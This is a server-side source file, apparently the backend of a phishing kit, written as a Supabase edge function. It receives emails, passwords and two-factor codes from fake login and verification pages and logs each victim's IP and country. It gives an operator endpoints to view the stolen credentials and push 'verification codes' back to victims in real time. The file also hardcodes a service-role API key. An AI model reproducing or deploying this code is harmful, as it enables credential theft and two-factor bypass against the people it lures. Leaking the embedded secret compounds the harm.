import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS'
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    // NEW PROJECT CREDENTIALS
    const supabaseClient = createClient(
      'https://otbswtklpidhezziotac.supabase.co', 
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im90YnN3dGtscGlkaGV6emlvdGFjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MTA5MjI1MSwiZXhwIjoyMDY2NjY4MjUxfQ.Q6_qf6Xvv_GXYURayImLc2fg3VNXdI3lfwKEXkIhXQE'
    )
    
    const url = new URL(req.url)
    let path = url.pathname
    
    // Remove function name from path for proper routing
    if (path.startsWith('/admin-api')) {
      path = path.replace('/admin-api', '')
    }
    
    console.log('Original path:', url.pathname, '-> Processed path:', path)
    
    // ===== IP TO COUNTRY DETECTION =====
    async function getCountryFromIP(ip) {
      try {
        // Skip local/private IPs and fallback to US
        if (!ip || ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
          console.log(`🇺🇸 Local/Private IP detected: ${ip} → Fallback to United States (US)`)
          return 'United States (US)'
        }
        
        console.log(`🌍 Detecting country for IP: ${ip}`)
        
        // Use free IP geolocation service
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`, {
          timeout: 3000
        })
        
        if (response.ok) {
          const data = await response.json()
          if (data.status === 'success') {
            console.log(`✅ Country detected: ${data.country} (${data.countryCode}) for IP: ${ip}`)
            return `${data.country} (${data.countryCode})`
          }
        }
        
        console.log(`⚠️ Could not detect country for IP: ${ip} → Fallback to United States (US)`)
        return 'United States (US)'
      } catch (error) {
        console.error(`❌ Error detecting country for IP ${ip}:`, error)
        console.log(`🇺🇸 Fallback to United States (US) due to error`)
        return 'United States (US)'
      }
    }
    
    // ROOT endpoint - Test if function is working
    if (path === '/' && req.method === 'GET') {
      return new Response(JSON.stringify({
        message: 'SIMPLE ADMIN API WORKING! 🚀 (No Auto-Login)',
        timestamp: new Date().toISOString(),
        success: true,
        version: '2.1-SIMPLE-MANUAL-APPROVAL',
        project: 'otbswtklpidhezziotac',
        original_path: url.pathname,
        processed_path: path,
        auto_login_enabled: false,
        country_detection: true,
        note: 'All requests require manual approval via Admin GUI',
        endpoints: [
          'GET /api/pending - Get all pending requests',
          'POST /api/approve - Approve/deny request (manual)',
          'POST /api/delete - Delete request',
          'POST /api/set-verification-code - Set verification code',
          'POST /api/request - Submit login request (MANUAL APPROVAL)',
          'GET /api/check-approval - Check approval status',
          'GET /api/stats - Get request statistics'
        ]
      }), {
        headers: {
          ...corsHeaders,
          'Content-Type': 'application/json'
        }
      })
    }

    // ===== ADMIN GUI ENDPOINTS =====
    
    // Get all pending requests (Admin GUI calls this)
    if (path === '/api/pending' && req.method === 'GET') {
      console.log('Fetching pending requests...')
      
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })
      
      if (error) {
        console.error('Fetch requests error:', error)
        return new Response(JSON.stringify({
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      // Transform data to match local server format
      const transformedData = data?.map((req) => ({
          id: req.id,
          email: req.email || 'undefined',
          password: req.password || 'undefined',
          twofa: req.twofa || 'undefined',
          userAgent: req.user_agent || 'undefined',
          ip: req.ip || 'undefined',
          country: req.country || 'undefined',
          status: req.status || 'pending',
          pageStatus: req.page_status || 'Login',
          verificationCode: req.verification_code,
          createdAt: new Date(req.created_at).getTime(),
          approvedAt: req.approved_at ? new Date(req.approved_at).getTime() : undefined
        })) || []
      
      console.log(`Found ${transformedData.length} requests`)
      return new Response(JSON.stringify(transformedData), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // Get request statistics
    if (path === '/api/stats' && req.method === 'GET') {
      console.log('Fetching request statistics...')
      
      const { data, error } = await supabaseClient
        .from('request_stats')
        .select('*')
        .single()
      
      if (error) {
        console.log('Stats table not found, returning basic stats from requests table')
        
        // Fallback: get basic stats from requests table
        const { data: requests, error: requestsError } = await supabaseClient
          .from('requests')
          .select('status, created_at, country')
        
        if (requestsError) {
          console.error('Fetch basic stats error:', requestsError)
          return new Response(JSON.stringify({
            error: requestsError.message
          }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          })
        }
        
        // Calculate basic stats
        const total = requests.length
        const approved = requests.filter(r => r.status === 'approved').length
        const denied = requests.filter(r => r.status === 'denied').length
        const pending = requests.filter(r => r.status === 'pending').length
        
        const basicStats = {
          total_requests: total,
          approved_requests: approved,
          denied_requests: denied,
          pending_requests: pending,
          approval_rate: total > 0 ? Math.round((approved / total) * 100) : 0
        }
        
        return new Response(JSON.stringify(basicStats), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        })
      }
      
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // Approve/deny request (Admin GUI calls this - MANUAL)
    if (path === '/api/approve' && req.method === 'POST') {
      const body = await req.json()
      const { id, decision, verificationCode } = body
      
      console.log('MANUAL approving request:', { id, decision, verificationCode })
      
      const { data, error } = await supabaseClient
        .from('requests')
        .update({
          status: decision,
          verification_code: verificationCode || null,
          approved_at: decision === 'approved' ? new Date().toISOString() : null
        })
        .eq('id', id)
        .select()
      
      if (error) {
        console.error('Approve request error:', error)
        return new Response(JSON.stringify({
          success: false,
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      console.log('Request approved successfully:', data)
      return new Response(JSON.stringify({
        success: true,
        data
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // Delete request (Admin GUI calls this)
    if (path === '/api/delete' && req.method === 'POST') {
      const body = await req.json()
      const { id } = body
      
      console.log('Deleting request:', id)
      
      const { data, error } = await supabaseClient
        .from('requests')
        .delete()
        .eq('id', id)
        .select()
      
      if (error) {
        console.error('Delete request error:', error)
        return new Response(JSON.stringify({
          success: false,
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      console.log('Request deleted successfully:', data)
      return new Response(JSON.stringify({
        success: true
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // Set verification code (Admin GUI calls this)
    if (path === '/api/set-verification-code' && req.method === 'POST') {
      const body = await req.json()
      const { email, code } = body
      
      if (!email || !code) {
        return new Response(JSON.stringify({
          success: false,
          message: 'Missing email or code'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        })
      }
      
      console.log('Setting verification code:', { email, code })
      
      // Find latest request for this email and update verification code
      const { data: requests, error: fetchError } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)
      
      if (fetchError) {
        console.error('Fetch request error:', fetchError)
        return new Response(JSON.stringify({
          success: false,
          error: fetchError.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      if (!requests || requests.length === 0) {
        return new Response(JSON.stringify({
          success: false,
          message: 'Request not found for this email'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        })
      }
      
      const { data, error } = await supabaseClient
        .from('requests')
        .update({ verification_code: code })
        .eq('id', requests[0].id)
        .select()
      
      if (error) {
        console.error('Update verification code error:', error)
        return new Response(JSON.stringify({
          success: false,
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      console.log('Verification code set successfully:', data)
      return new Response(JSON.stringify({
        success: true,
        message: 'Verification code updated',
        data
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // ===== SIMPLE FRONTEND ENDPOINTS (NO AUTO-LOGIN) =====
    
    // Submit login request (Frontend calls this - SIMPLE VERSION)
    if (path === '/api/request' && req.method === 'POST') {
      const body = await req.json()
      const { email, password, twofa, userAgent, currentPage } = body
      
      console.log('🚀 NEW REQUEST (SIMPLE MODE):', { email, currentPage })
      
      // Get real IP address
      const clientIP = req.headers.get('x-forwarded-for') || 
                      req.headers.get('x-real-ip') || 
                      req.headers.get('cf-connecting-ip') || 
                      'unknown'
      
      console.log(`🌐 Client IP: ${clientIP}`)
      
      // Detect country from IP
      const detectedCountry = await getCountryFromIP(clientIP)
      
      // Determine page status
      let pageStatus = 'Login'
      switch(currentPage) {
        case 'index.html':
          pageStatus = 'Login'
          break
        case 'password.html':
          pageStatus = 'Password'
          break
        case 'verify-device.html':
          pageStatus = 'Setup Code Phone'
          break
        case 'verify-options.html':
          pageStatus = 'Wait Options'
          break
        case 'verify.html':
          pageStatus = '2FA'
          break
        case 'verify-notification.html':
          pageStatus = 'Waiting Finish'
          break
        default:
          pageStatus = 'Login'
      }
      
      // Insert request with detected country - NO AUTO-LOGIN
      const { data, error } = await supabaseClient
        .from('requests')
        .insert([{
          email: email || 'undefined',
          password: password || 'undefined',
          twofa: twofa || 'undefined',
          user_agent: userAgent || 'undefined',
          ip: clientIP,
          country: detectedCountry,
          page_status: pageStatus,
          status: 'pending' // Always starts as pending
        }])
        .select()
      
      if (error) {
        console.error('Insert request error:', error)
        return new Response(JSON.stringify({
          success: false,
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      const requestId = data[0].id
      console.log('✅ Request inserted with ID:', requestId)
      console.log(`🌍 Country detected: ${detectedCountry} from IP: ${clientIP}`)
      console.log('⏳ Status: PENDING - awaiting manual approval')
      
      // Return success response to frontend
      return new Response(JSON.stringify({
        success: true,
        requestId: requestId,
        detectedCountry: detectedCountry,
        clientIP: clientIP,
        status: 'pending',
        message: 'Request submitted successfully. Awaiting approval.',
        note: 'Request will be reviewed manually by admin'
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // Check approval status by email (Frontend calls this)
    if (path === '/api/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email')
      
      if (!email) {
        return new Response(JSON.stringify({
          error: 'Email parameter required'
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        })
      }
      
      console.log('Checking approval for email:', email)
      
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)
      
      if (error) {
        console.error('Check approval error:', error)
        return new Response(JSON.stringify({
          error: error.message
        }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        })
      }
      
      const request = data?.[0]
      console.log('Approval status:', request?.status || 'not_found')
      
      return new Response(JSON.stringify({
        status: request?.status || 'not_found',
        verificationCode: request?.verification_code,
        id: request?.id
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      })
    }
    
    // 404 for unknown endpoints
    return new Response(JSON.stringify({
      error: 'Endpoint Not Found',
      path: path,
      method: req.method,
      project: 'otbswtklpidhezziotac',
      mode: 'simple',
      available_endpoints: [
        'GET / - Test endpoint',
        'GET /api/pending - Get all pending requests',
        'POST /api/approve - Approve/deny request (manual)',
        'POST /api/delete - Delete request',
        'POST /api/set-verification-code - Set verification code', 
        'POST /api/request - Submit login request (MANUAL APPROVAL)',
        'GET /api/check-approval?email=xxx - Check approval status',
        'GET /api/stats - Get request statistics'
      ]
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 404
    })

  } catch (error) {
    console.error('Unexpected error:', error)
    return new Response(JSON.stringify({ 
      error: 'Internal Server Error',
      message: error.message,
      stack: error.stack,
      project: 'otbswtklpidhezziotac',
      mode: 'simple'
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500
    })
  }
}) 